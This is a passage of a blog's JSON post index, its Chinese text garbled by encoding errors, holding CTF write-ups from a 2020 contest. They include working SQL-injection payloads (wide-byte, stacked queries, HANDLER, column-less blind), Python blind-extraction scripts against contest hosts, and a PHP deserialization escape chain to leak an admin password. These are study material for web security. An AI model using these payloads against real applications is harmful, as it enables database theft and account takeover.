å¯¹ç…§tp6æ–‡ä»¶ï¼Œå…ˆå°†index.phpç§»åˆ°publicä¸­ï¼Œå†ä¿®æ”¹ require __DIR__ . &#39;/../vendor/autoload.php&#39;; åˆæŠ¥é”™ æ¨¡æ¿æ–‡ä»¶ä¸å­˜åœ¨:public/static/tamplate/index\\index.html ä½†æ˜¯æ˜æ˜è·¯å¾„æ²¡é”™ï¼ŒæŸ¥çœ‹é…ç½® config/view.phpä¿®æ”¹view_dir_nameä¸ºpublic ä¿®æ”¹app/home/config/view.phpä¸ºstatic/tamplate/ æ€»ç®—èƒ½ç”¨äº†ã€‚ã€‚ åœ¨ç™»å½•çš„æ—¶å€™è®¾ç½®sessionçš„æ—¶å€™ä¿®æ”¹sessionidï¼Œåœ¨æŸ¥è¯¢çš„æ—¶å€™ç”¨è¿™ä¸ªsessionidå³å¯æ·»åŠ ä»»æ„å†…å®¹ ä½†æ˜¯è¿™æ ·è®¿é—®ä¸åˆ°ï¼Œéœ€è¦å†™å…¥app/home/controller/a.phpä¸‹ï¼Œ æ„é€ ../../../../app/home/controller/a.php é•¿åº¦37 ä¹Ÿæ²¡æœ‰æ–‡ä»¶åŒ…å«çš„åœ°æ–¹ã€‚ã€‚é‚ä½œç½¢ æ­£è§£å°±æ˜¯é¢˜ç›®ç¯å¢ƒç›´æ¥è®¿é—®å°±è¡Œã€‚ã€‚ å› ä¸ºæˆ‘æœ¬åœ°ä¿®æ”¹äº†ä¸€äº›é…ç½®å¯¼è‡´æ— æ³•è®¿é—®ã€‚ã€‚ä½†æ˜¯ä¸æ”¹è°ƒè¯•ä¸äº†ã€‚ã€‚ æœ€åè¿˜éœ€è¦bypassdisable_funcï¼Œéœ€è¦æ‰§è¡Œ/readflag è¿™ä¸ªåšè¿‡å‡ æ¬¡ï¼Œè¿‡æ»¤äº†å¾ˆå¤šï¼ŒåŒ…æ‹¬mail()ç­‰ https://github.com/mm0r1/exploits","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"2020æ–°æ˜¥æˆ˜ç–«-ç½‘ç»œå®‰å…¨å…¬ç›Šèµ›-2","slug":"2020æ–°æ˜¥æˆ˜ç–«-ç½‘ç»œå®‰å…¨å…¬ç›Šèµ›-2","date":"2020-02-22T14:56:52.000Z","updated":"2020-02-23T08:23:23.089Z","comments":true,"path":"2020/02/22/2020æ–°æ˜¥æˆ˜ç–«-ç½‘ç»œå®‰å…¨å…¬ç›Šèµ›-2/","link":"","permalink":"https://glotozz.github.io/2020/02/22/2020æ–°æ˜¥æˆ˜ç–«-ç½‘ç»œå®‰å…¨å…¬ç›Šèµ›-2/","excerpt":"","text":"æ”¾ä¸Šæˆ‘xxxxx easysqli_copyçœ‹åˆ°PDO+set names gbk å°±æƒ³åˆ°å®½å­—èŠ‚æ³¨å…¥ï¼Œä¹‹å‰çœ‹è¿‡çš„æ–‡ç«  ä»å®½å­—èŠ‚æ³¨å…¥è®¤è¯†PDOçš„åŸç†å’Œæ­£ç¡®ä½¿ç”¨ï¼šhttps://www.freebuf.com/articles/web/216336.html ç®€å•æµ‹è¯•äº†ä¸‹ï¼Œå‘ç°å¯ä»¥ï¼Œä½†æ˜¯è¿‡æ»¤äº†selectï¼Œæˆ‘ç®€å•æµ‹è¯•äº†ä¸‹å‘ç°å­˜åœ¨å †å æ³¨å…¥ï¼Œæ²¡æœ‰è¿‡æ»¤=ï¼Œä¸‡äº‹å¤§å‰ 1234select hex(&apos;select sleep(5)&apos;);set @a=0x73656C65637420736C656570283529;prepare smtm_test from @a;execute smtm_test; 1?id=1%df&apos;;set%20@a=0x73656C65637420736C656570283529;prepare%20smtm_test%20from%20@a;execute%20smtm_test; è„šæœ¬ 12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/env python2# coding=utf-8import urllibimport requestsurl = \"http://d157325460674375820d1c51bd80f6adc9672fe83ab44e0e.changame.ichunqiu.com/?id=\"headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0',&#125;flag = \"\"tmp = 0for i in range(1, 100): if tmp == 1: break tmp = 1 for j in range(32, 127): # payload = \"select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())\" # payload = \"select(group_concat(column_name))from(information_schema.columns)where(table_name='table1')\" payload = \"select(group_concat(fllllll4g))from(table1)\" payload = \"select if(ascii(substr((&#123;&#125;),&#123;&#125;,1))=&#123;&#125;,sleep(3),1)\".format(payload, i, j) # print payload payload = payload.encode('hex') param = \"1\"+urllib.unquote(\"%df\")+\"';set @a=0x&#123;&#125;;prepare smtm_test from @a;execute smtm_test;\".format(payload) param = urllib.quote(param) # print(param) try: url1 = url + param r = requests.get(url=url1, timeout=3) if r.status_code != 200: j -= 1 continue # print(r.content.decode('utf-8')) except requests.exceptions.ReadTimeout as e: tmp = 0 flag = flag + chr(j) print(flag) breakprint(flag) blacklist1return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i&quot;,$inject); emmï¼Œè¿™ä¸ªé»‘åå•ä¼¼ä¹å¯ä»¥ç”¨æ˜¨å¤©çš„expæ‰“ã€‚ã€‚ã€‚ 1inject=1&apos;and if(database() regexp&quot;^s&quot;,sleep(3),1)%23 éœ€è¦å…ˆåˆ©ç”¨å †å æ³¨å…¥æŸ¥è¯¢è¡¨å’Œå­—æ®µ 11&apos;;show tables;# å¾—åˆ°FlagHere 11&apos;; show columns from `FlagHere`; # å¾—åˆ°flag 1&#39;and if((FlagHere.flag regexp&#39;^{}&#39;),sleep(5),1)%23 è¿˜æœ‰ä¸ªé—®é¢˜ï¼Œå°±æ˜¯åˆ©ç”¨æ˜¨å¤©çš„æ–¹æ³•åªèƒ½æŸ¥å½“å‰è¡¨ï¼Œè€Œflagåœ¨å¦ä¸€å¼ è¡¨ä¸­ã€‚ é‚ä½œç½¢ https://www.4hou.com/posts/mM60 éªšæ“ä½œï¼šhandler 12345678910HANDLER tbl_name OPEN [ [AS] alias] HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...) [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125; [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name READ &#123; FIRST | NEXT &#125; [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name CLOSE 11&apos;;handler FlagHere open as a;handler a READ first;# å¾—åˆ°flag Ezsqlibpè·‘ä¸€ä¸‹sqlå­—å…¸ ä¸æ˜¯200å°±æ˜¯500,500çš„æ˜¯è¯­æ³•é”™è¯¯ï¼Œå…¶å®è¿‡æ»¤å­—ç¬¦çš„å¹¶ä¸å¤š æ•°å­—å‹ï¼Œæœ‰å›æ˜¾è€ƒè™‘ç›²æ³¨ï¼Œç®€å•æ„é€ äº†ä¸‹æˆäº† bpè·‘ä¸€ä¸‹å‘ç°cçš„æ—¶å€™Hello Nu1L æ•°æ®åº“ä¸ºctf,mysqlç‰ˆæœ¬ä¸º5.7.1 å‘ç°innodbä¹Ÿè¢«è¿‡æ»¤ã€‚ã€‚ èŠä¸€èŠbypass information_schemaï¼šhttps://www.anquanke.com/post/id/193512 å‰æè¦æ˜¯mysql â‰¥ 5.7ç‰ˆæœ¬ æ–°ç‰¹æ€§sys.schema_auto_increment_columnsä¹Ÿè¢«è¿‡æ»¤ã€‚ã€‚ 1select table_name from sys.schema_auto_increment_columns where table_schema=&apos;ctf&apos; è¿˜æœ‰å¦ä¸€ç§ 1sys.schema_table_statistics_with_buffer 1select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer æˆåŠŸå¾—åˆ°äº†è¡¨åusers233333333333333,f1ag_1s_h3r3_hhhhh, 1select * from f1ag_1s_h3r3_hhhhh æŠ¥500é”™è¯¯ï¼Œè¯´æ˜ä¸æ­¢1åˆ—ã€‚ã€‚ã€‚çŒœäº†å‡ ä¸ªå­—æ®µä¹Ÿä¸è¡Œ==ï¼æ— åˆ—åæ³¨å…¥å®åœ¨æä¸å‡ºæ¥ã€‚ã€‚ æ­£è§£ 1(select 1,0x61)&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1) è„šæœ¬ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#!/usr/bin/env python2# coding=utf-8import requestss = requests.session()url = \"http://f1378e453faf447696702f67444c2575579c8764a54a4e37.changame.ichunqiu.com/\"headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0'&#125;cookies = &#123;&#125;data = &#123;&#125;flag = \"\"tmp = 0# for i in range(1, 100):# if tmp == 1:# break# tmp = 1# for j in range(32, 127):# # payload = \"select version()\"# payload = \"select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer\"# param = \"0^(ascii(substr((&#123;&#125;),&#123;&#125;,1))=&#123;&#125;)#\".format(payload, str(i), str(j))# print(param)# data = &#123;# 'id': param# &#125;# r = requests.post(url=url, headers=headers, data=data)# # print(r.content.decode('utf-8'))# if \"Nu1L\" in r.content.decode(\"utf-8\"):# tmp = 0# flag = flag + chr(j)# print(flag)# break# print(flag)flag = ''for i in range(1,100): for j in range(32,127): # param = \"0^((select 1,0x&#123;&#125;)&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1))#\".format((flag + chr(j)).encode('hex')) param = \"0^((select 1,concat('&#123;&#125;', CAST('0' as json)))&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1))#\".format(flag + chr(j)) # print param data = &#123; 'id': param &#125; r = requests.post(url=url, headers=headers, data=data) if \"Nu1L\" in r.content.decode(\"utf-8\"): tmp = 0 flag = flag + chr(j-1) print(flag) break print(flag) æœ‰ä¸ªç¼ºé™·ï¼Œå°±æ˜¯ä¸åŒºåˆ†å¤§å°å†™ã€‚ã€‚ https://www.smi1e.top/%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b-ezsqli-%e5%87%ba%e9%a2%98%e5%b0%8f%e8%ae%b0/?tdsourcetag=s_pctim_aiomsg é¢„æœŸè§£æ˜¯æ–‡ç« ä¸­æåˆ°çš„ä½¿ç”¨ SELECT CONCAT(&quot;A&quot;, CAST(0 AS JSON)) æ¥å¦å…¶è¿”å›äºŒè¿›åˆ¶å­—ç¬¦ä¸²ï¼Œä»è€ŒåŒºåˆ†å¤§å°å†™ã€‚ æµ‹è¯•äº†ä¸€ä¸‹ SELECT CONCAT(&quot;A&quot;, CAST(0 AS JSON)) éœ€è¦mysql&gt;=5.7 å¯¹äºsys.x$schema_table_statistics_with_bufferæ˜¯è§†å›¾ï¼Œæ‰€ä»¥ä¸€å¼€å§‹æœ¬åœ°æ²¡æ‰¾åˆ°==ï¼ è§†å›¾æ˜¯åœ¨åŸºæœ¬è¡¨ä¹‹ä¸Šå»ºç«‹çš„è¡¨ï¼Œå®ƒçš„ç»“æ„ï¼ˆå³æ‰€å®šä¹‰çš„åˆ—ï¼‰å’Œå†…å®¹ï¼ˆå³æ‰€æœ‰è®°å½•ï¼‰éƒ½æ¥è‡ªåŸºæœ¬è¡¨ï¼Œå®ƒä¾æ®åŸºæœ¬è¡¨å­˜åœ¨è€Œå­˜åœ¨ã€‚ä¸€ä¸ªè§†å›¾å¯ä»¥å¯¹åº”ä¸€ä¸ªåŸºæœ¬è¡¨ï¼Œä¹Ÿå¯ä»¥å¯¹åº”å¤šä¸ªåŸºæœ¬è¡¨ã€‚è§†å›¾æ˜¯åŸºæœ¬è¡¨çš„æŠ½è±¡å’Œåœ¨é€»è¾‘æ„ä¹‰ä¸Šå»ºç«‹çš„æ–°å…³ç³»ã€‚","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"2020æ–°æ˜¥æˆ˜ç–«-ç½‘ç»œå®‰å…¨å…¬ç›Šèµ›-1","slug":"2020æ–°æ˜¥æˆ˜ç–«-ç½‘ç»œå®‰å…¨å…¬ç›Šèµ›-1","date":"2020-02-22T07:05:27.000Z","updated":"2020-02-23T08:23:45.323Z","comments":true,"path":"2020/02/22/2020æ–°æ˜¥æˆ˜ç–«-ç½‘ç»œå®‰å…¨å…¬ç›Šèµ›-1/","link":"","permalink":"https://glotozz.github.io/2020/02/22/2020æ–°æ˜¥æˆ˜ç–«-ç½‘ç»œå®‰å…¨å…¬ç›Šèµ›-1/","excerpt":"","text":"æœ€è¿‘åšå•¥éƒ½æ²¡è€å¿ƒ==ï¼ ç›²æ³¨ç»™äº†æºç ï¼Œç®€å•æµ‹ä¸€ä¸‹è¿‡æ»¤å†…å®¹ selectè¢«è¿‡æ»¤ï¼ï¼ä»¥åŠ= likeç­‰ï¼Œå¯ç”¨regexp æ²¡æœ‰å›æ˜¾è€ƒè™‘æ—¶é—´ç›²æ³¨ã€‚selectè¢«è¿‡æ»¤ï¼Œæˆ‘é€šå¸¸ä¸¤ç§åŠæ³•ï¼Œ ä¸ç”¨selectï¼ˆåªèƒ½æŸ¥å½“å‰è¡¨ï¼‰11 and if(1,sleep(5),1) æˆåŠŸå»¶æ—¶ 121 and if(database() regexp(&apos;^&apos;))1 and if((flllllllag.fl4g regexp&quot;^f&quot;),sleep(5),1) ä¸€å¼€å§‹ä¸çŸ¥é“ä¸ºå•¥è·‘åˆ°flag{å°±æ–­äº†ï¼Œç´¢æ€§åŠ ä¸ªhex()ï¼Œå°±å¥½äº† 1234567891011121314151617181920212223242526272829303132333435#!/usr/bin/env python2# coding=utf-8import stringimport requestsurl = \"http://de1da794b0d046e6abd2bf3f1a1c8f8d25930eca82df4eb4.changame.ichunqiu.com/?id=\"headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0'&#125;easy_string = string.digits + string.ascii_letters# print easy_stringflag = \"\"tmp = 0flag = ''for i in range(1, 100): if tmp == 1: break tmp = 1 for j in easy_string: param = '2 or if((hex(flllllllag.fl4g) regexp\"^&#123;&#125;\"),sleep(5),1)'.format(flag+j) # print param try: url1 = url + param r = requests.get(url=url1, headers=headers, timeout=3) # if r.status_code != 200: # j -= 1 # continue # print(r.content.decode('utf-8')) except requests.exceptions.ReadTimeout as e: tmp = 0 flag = flag + j print(flag) breakprint(flag) ç¬¬äºŒç§ï¼Œåˆ©ç”¨å †å æ³¨å…¥ï¼Œ16è¿›åˆ¶+mysqlé¢„å¤„ç† å †å æ³¨å…¥ï¼š https://www.jianshu.com/p/36f0772f5ce8 å…ˆåˆ¤æ–­èƒ½å¦å †å æ³¨å…¥ï¼Œæ—¢ç„¶ä¸èƒ½ç”¨selectï¼Œç”¨showä»£æ›¿ 11;show tables;# å‘ç°æ²¡æœ‰æŠ¥500ï¼Œåº”è¯¥å¯ä»¥å †å æ³¨å…¥ 3ç§payload 1PREPARE jwt from concat(char(115,101,108,101,99,116), &apos; * from `1919810931114514` &apos;);EXECUTE jwt;# 1SET @sql=concat(char(115,101,108,101,99,116),&apos;* from `1919810931114514`&apos;);PREPARE jwt from @sql;EXECUTE jwt;# 1PREPARE jwt from concat(&apos;s&apos;,&apos;elect&apos;, &apos; * from `1919810931114514` &apos;);EXECUTE jwt;# ä½†æ˜¯æˆ‘æœ¬åœ°æµ‹è¯•æ—¶åªæœ‰ç¬¬äºŒä¸ªèƒ½æ‰§è¡Œï¼Œè€Œç¬¬äºŒä¸ªæ°æ°ä½¿ç”¨äº†= çŒœæµ‹æ˜¯ç‰ˆæœ¬é—®é¢˜ï¼Œå…ˆå»çœ‹äº†åŸé¢˜ ç®€å•æ¥è¯´ï¼ŒMariaDBæ˜¯MySQLæºä»£ç çš„ä¸€ä¸ªåˆ†æ”¯ , MariaDBåŒ…æ‹¬çš„ä¸€äº›æ–°ç‰¹æ€§ä½¿å®ƒä¼˜äºMySQLã€‚ MariaDBè·ŸMySQLåœ¨ç»å¤§å¤šæ•°æ–¹é¢æ˜¯å…¼å®¹çš„ï¼Œå¯¹äºå¼€å‘è€…æ¥è¯´ï¼Œå‡ ä¹æ„Ÿè§‰ä¸åˆ°ä»»ä½•ä¸åŒã€‚ ç„¶åæˆ‘æŠŠæœ¬åœ°mysqlç‰ˆæœ¬åˆ‡åˆ°mysql8.0.12ï¼Œå·²é€‰æ‹©æ‰§è¡Œæ˜¯æ­£å¸¸çš„ï¼Œæ•´ä¸ªæ‰§è¡Œè¿˜æ˜¯ä¸€æ ·ä¸è¡Œ æƒ³ç›´æ¥åœ¨é¢˜ç›®ä¸Šæ‰“ä¸€æ‰“è¯•è¯•ï¼Œå‘ç°ç¯å¢ƒå·²ç»å…³äº†ï¼Œé‚ä½œç½¢ babyphpwww.zipæºç æ³„éœ²ï¼Œä»£ç å®¡è®¡ï¼Œæ€è·¯å¾ˆæ˜ç¡®ï¼Œ 1234if($_SESSION[&apos;login&apos;]===1)&#123; require_once(&quot;flag.php&quot;); echo $flag;&#125; éœ€è¦æˆåŠŸç™»å½•adminï¼Œ å¯»æ‰¾ååºåˆ—åŒ–å…¥å£ï¼Œ 123456789101112public function update()&#123; $Info=unserialize($this-&gt;getNewinfo()); $age=$Info-&gt;age; $nickname=$Info-&gt;nickname; $updateAction=new UpdateHelper($_SESSION[&apos;id&apos;],$Info,&quot;update user SET age=$age,nickname=$nickname where id=&quot;.$_SESSION[&apos;id&apos;]); //è¿™ä¸ªåŠŸèƒ½è¿˜æ²¡æœ‰å†™å®Œ å…ˆå å‘&#125;public function getNewInfo()&#123; $age=$_POST[&apos;age&apos;]; $nickname=$_POST[&apos;nickname&apos;]; return safe(serialize(new Info($age,$nickname)));&#125; æ­£å¸¸æƒ…å†µä¸‹è¿™é‡Œçš„ååºåˆ—åŒ–æˆ‘ä»¬åªèƒ½æ§åˆ¶Infoç±»çš„ä¸¤ä¸ªå±æ€§ï¼Œä½†æ˜¯è¿™é‡Œé€šè¿‡safe()æ–¹æ³•å¯ä»¥é€ƒé€¸å­—ç¬¦ï¼Œç”šè‡³è¿˜å¯ä»¥é€ƒé€¸å¯¹è±¡ æ€è·¯ä¸€ã€ User-&gt;__destruct()è¯»å–flag.php ä½†æ˜¯å¾ˆå¿«å°±å‘ç°è¡Œä¸é€šã€‚é¦–å…ˆæ˜¯returnï¼Œä¸ä¼šæ‰“å°å‡ºæ¥ï¼Œå…¶æ¬¡flagè¢«è¿‡æ»¤æ›¿æ¢æˆhacker æ€è·¯äºŒã€ æ³¨å‡ºadminå¯†ç ç™»é™†åæŸ¥çœ‹ UpdateHelperç±»-&gt;__destruct() Userç±»-&gt;toString() Infoç±»-&gt;__call() dbCtrlç±»-&gt;login() æ„é€ ä¸€ä¸ªæ­£å¸¸çš„payloadï¼Œæ¯”å¦‚POST:age=&amp;nickname= 1O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:0:&quot;&quot;;s:8:&quot;nickname&quot;;s:0:&quot;&quot;;s:8:&quot;CtrlCase&quot;;N;&#125; æµ‹è¯•é€ƒé€¸ï¼Œæ¯”å¦‚é€ƒé€¸å‡º$CtrlCaseçš„å€¼ä¸ºhahaï¼Œ 1O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:0:&quot;&quot;;s:8:&quot;nickname&quot;;s:0:&quot;&quot;;s:8:&quot;CtrlCase&quot;;s:4:&quot;haha&quot;;&#125; paylaod 1&quot;;s:8:&quot;CtrlCase&quot;;s:4:&quot;haha&quot;;&#125; éœ€è¦é€ƒé€¸29ä¸ªå­—ç¬¦ï¼Œ&#39;-&gt;hackeré€ƒé€¸5ä¸ªå­—ç¬¦,æ„é€ 5ä¸ªå•å¼•å·å’Œ4ä¸ªunion POST:age=&amp;nickname=&#39;&#39;&#39;&#39;&#39;unionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;s:4:&quot;haha&quot;;} ä¸‹é¢æ˜¯åºåˆ—åŒ–å†…å®¹ 1O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:0:&quot;&quot;;s:8:&quot;nickname&quot;;s:55:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhacker1&quot;;s:8:&quot;CtrlCase&quot;;s:4:&quot;haha&quot;;&#125;&quot;;s:8:&quot;CtrlCase&quot;;N;&#125; å†ä¸¾ä¸ªé€ƒé€¸å¯¹è±¡çš„ä¾‹å­ 1O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:0:&quot;&quot;;s:8:&quot;nickname&quot;;s:0:&quot;&quot;;s:8:&quot;CtrlCase&quot;;O:4:&quot;User&quot;:1:&#123;s:8:&quot;nickname&quot;;s:8:&quot;flag.php&quot;;&#125;&#125; 1&quot;;s:8:&quot;CtrlCase&quot;;O:4:&quot;User&quot;:1:&#123;s:8:&quot;nickname&quot;;s:8:&quot;flag.php&quot;;&#125;&#125; 63ä¸ªé€ƒé€¸å­—ç¬¦-12ä¸ªå•å¼•å·å’Œ3ä¸ªunionï¼Œè¿™é‡Œè¦æ³¨æ„çš„æ˜¯é¢˜ç›®ä¸­flagä¹Ÿè¢«æ›¿æ¢æˆhacker åœ¨æ„é€ å‰åˆ†æä¸‹sql 123456789$result=$this-&gt;mysqli-&gt;prepare($sql);$result-&gt;bind_param(&apos;s&apos;, $this-&gt;name);$result-&gt;execute();$result-&gt;bind_result($idResult, $passwordResult);$result-&gt;fetch();$result-&gt;close();if ($this-&gt;token==&apos;admin&apos;) &#123; return $idResult;&#125; è¿”å›ç»“æœé›†ä¸­çš„$idResultï¼ŒæŸ¥è¯¢çš„æ—¶å€™æŠŠç¬¬ä¸€ä¸ªå‚æ•°æ”¹ä¸ºpasswordå³å¯ 1select password,id from user where username=? payload 12345678910111213141516171819202122232425262728293031323334&lt;?phpClass UpdateHelper&#123; public $sql;&#125;Class User&#123; public $nickname; public $age;&#125;Class Info&#123; public $age; public $CtrlCase;&#125;Class dbCtrl&#123; public $name; public $hostname=\"127.0.0.1\"; public $dbuser=\"noob123\"; public $dbpass=\"noob123\"; public $database=\"noob123\"; public $token;&#125;$d = new dbCtrl;$d-&gt;name = 'admin';$d-&gt;token = 'admin';$c = new Info;$c-&gt;CtrlCase = $d;$b = new User;$b-&gt;age = 'select password,id from user where username=?';$b-&gt;nickname = $c;$a = new UpdateHelper;$a-&gt;sql = $b;echo serialize($a);?&gt; å¾—åˆ° 1O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:2:&#123;s:3:&quot;age&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:6:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:7:&quot;noob123&quot;;s:6:&quot;dbpass&quot;;s:7:&quot;noob123&quot;;s:8:&quot;database&quot;;s:7:&quot;noob123&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username=?&quot;;&#125;&#125; æ»¡è¶³æ ¼å¼ 1&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:2:&#123;s:3:&quot;age&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:6:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:7:&quot;noob123&quot;;s:6:&quot;dbpass&quot;;s:7:&quot;noob123&quot;;s:8:&quot;database&quot;;s:7:&quot;noob123&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username=?&quot;;&#125;&#125;&#125; 365ä½ï¼Œ73ä¸ªå•å¼•å· 1age=&amp;nickname=&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:2:&#123;s:3:&quot;age&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:6:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:7:&quot;noob123&quot;;s:6:&quot;dbpass&quot;;s:7:&quot;noob123&quot;;s:8:&quot;database&quot;;s:7:&quot;noob123&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username=?&quot;;&#125;&#125;&#125; md5è§£å¯†ç™»å½•å³å¯ å‚è€ƒé“¾æ¥: http://p3rh4ps.top/index.php/2020/02/21/820-2-21-i%e6%98%a5%e7%a7%8b%e5%85%ac%e7%9b%8a%e8%b5%9b%e5%87%ba%e9%a2%98%e7%ac%94%e8%ae%b0/?tdsourcetag=s_pctim_aiomsg","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"New Start","slug":"start","date":"2020-02-20T11:17:40.000Z","updated":"2020-02-20T11:59:16.262Z","comments":true,"path":"2020/02/20/start/","link":"","permalink":"https://glotozz.github.io/2020/02/20/start/","excerpt":"","text":"ã€‚å³æ˜¯ç»ˆç‚¹ä¹Ÿæ˜¯èµ·ç‚¹","categories":[],"tags":[]}]}